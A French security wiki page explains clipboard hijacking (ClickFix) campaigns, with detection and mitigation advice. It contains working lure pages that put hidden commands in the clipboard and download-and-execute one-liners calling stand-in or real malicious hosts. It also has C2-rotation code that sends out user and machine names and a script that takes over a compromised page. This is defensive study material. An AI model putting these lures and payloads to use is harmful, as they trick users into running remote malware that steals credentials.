# Attaques Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Ne collez jamais quelque chose que vous n'avez pas copié vous-même." – vieux mais toujours un bon conseil

## Aperçu

Clipboard hijacking – également connu sous le nom de *pastejacking* – exploite le fait que les utilisateurs copient-collent routinièrement des commandes sans les vérifier. Une page web malveillante (ou tout contexte exécutant JavaScript, comme une application Electron ou Desktop) place de manière programmatique du texte contrôlé par l'attaquant dans le system clipboard. Les victimes sont encouragées, généralement par des instructions d'ingénierie sociale soigneusement conçues, à appuyer sur **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ou à ouvrir un terminal et *paste* le contenu du clipboard, exécutant immédiatement des commandes arbitraires.

Parce qu'**aucun fichier n'est téléchargé et aucune pièce jointe n'est ouverte**, la technique contourne la plupart des contrôles de sécurité des e-mails et du contenu web qui surveillent les pièces jointes, les macros ou l'exécution directe de commandes. L'attaque est donc populaire dans les campagnes de phishing diffusant des familles de malware courantes telles que NetSupport RAT, Latrodectus loader ou Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## Le ClickFix / ClearFake Flow

1. L'utilisateur visite un site typosquatté ou compromis (p. ex. `docusign.sa[.]com`)
2. Un JavaScript injecté **ClearFake** appelle une fonction `unsecuredCopyToClipboard()` qui stocke silencieusement un one-liner PowerShell encodé en Base64 dans le presse-papiers.
3. Les instructions HTML disent à la victime : *« Appuyez sur **Win + R**, collez la commande et appuyez sur Entrée pour résoudre le problème. »*
4. `powershell.exe` s'exécute, téléchargeant une archive qui contient un exécutable légitime ainsi qu'une DLL malveillante (classique DLL sideloading).
5. Le loader décrypte des étapes supplémentaires, injecte du shellcode et installe une persistance (p. ex. tâche planifiée) — exécutant finalement NetSupport RAT / Latrodectus / Lumma Stealer.

### Exemple de chaîne NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart légitime) recherche dans son répertoire `msvcp140.dll`.
* La DLL malveillante résout dynamiquement les API avec **GetProcAddress**, télécharge deux binaires (`data_3.bin`, `data_4.bin`) via **curl.exe**, les décrypte en utilisant une clé XOR roulante `"https://google.com/"`, injecte le shellcode final et extrait **client32.exe** (NetSupport RAT) dans `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Télécharge `la.txt` avec **curl.exe**
2. Exécute le JScript downloader dans **cscript.exe**
3. Récupère un MSI payload → drops `libcef.dll` à côté d'une application signée → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
L'appel **mshta** lance un script PowerShell masqué qui récupère `PartyContinued.exe`, extrait `Boat.pst` (CAB), reconstruit `AutoIt3.exe` via `extrac32` et concaténation de fichiers, et enfin exécute un script `.a3x` qui exfiltre les identifiants de navigateur vers `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Certaines campagnes ClickFix évitent complètement les téléchargements de fichiers et demandent aux victimes de coller un one‑liner qui récupère et exécute du JavaScript via WSH, le rend persistant, et fait tourner le C2 quotidiennement. Exemple de chaîne observée :
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Caractéristiques clés
- URL obfusquée renversée à l'exécution pour contrer une inspection superficielle.
- JavaScript s'installe de façon persistante via un Startup LNK (WScript/CScript), et sélectionne le C2 selon le jour courant — permettant une rotation rapide des domaines.

Fragment JS minimal utilisé pour faire tourner les C2 en fonction de la date:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La phase suivante déploie généralement un loader qui établit la persistance et récupère un RAT (e.g., PureHVNC), souvent en fixant TLS sur un certificat codé en dur et en découpant le trafic.

Detection ideas specific to this variant
- Arbre des processus : `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts : LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registre/RunMRU et télémétrie de ligne de commande contenant `.split('').reverse().join('')` ou `eval(a.responseText)`.
- Appels répétés de `powershell -NoProfile -NonInteractive -Command -` avec de larges payloads stdin pour injecter de longs scripts sans lignes de commande longues.
- Scheduled Tasks qui exécutent ensuite des LOLBins tels que `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sous une tâche/chemin ressemblant à un updater (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Noms d'hôtes et URLs C2 tournant quotidiennement avec le pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Corréler clipboard write events suivis d'un collage Win+R puis d'une exécution immédiate de `powershell.exe`.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Des campagnes récentes fabriquent en masse de fausses pages de vérification CDN/browser ("Just a moment…", IUAM-style) qui forcent les utilisateurs à copier des commandes spécifiques à l'OS depuis leur clipboard dans des consoles natives. Cela déplace l'exécution hors du sandbox du navigateur et fonctionne sous Windows et macOS.

Key traits of the builder-generated pages
- Détection de l'OS via `navigator.userAgent` pour adapter les payloads (Windows PowerShell/CMD vs. macOS Terminal). Décoys/no-ops optionnels pour les OS non supportés afin de maintenir l'illusion.
- Copie automatique dans le clipboard lors d'actions UI bénignes (checkbox/Copy) alors que le texte visible peut différer du contenu du clipboard.
- Blocage mobile et un popover avec instructions étape par étape : Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Obfuscation optionnelle et injecteur monofichier pour écraser le DOM d'un site compromis avec une UI de vérification stylée Tailwind (no new domain registration required).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence de l'exécution initiale
- Utilisez `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` afin que l'exécution continue après la fermeture du terminal, réduisant les artefacts visibles.

In-place page takeover sur des sites compromis
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Pages that bind Clipboard API to verification widgets; mismatch between displayed text and clipboard payload; `navigator.userAgent` branching; Tailwind + single-page replace in suspicious contexts.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` shortly after a browser interaction; batch/MSI installers executed from `%TEMP%`.
- macOS endpoint: Terminal/iTerm spawning `bash`/`curl`/`base64 -d` with `nohup` near browser events; background jobs surviving terminal close.
- Correlate `RunMRU` Win+R history and clipboard writes with subsequent console process creation.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
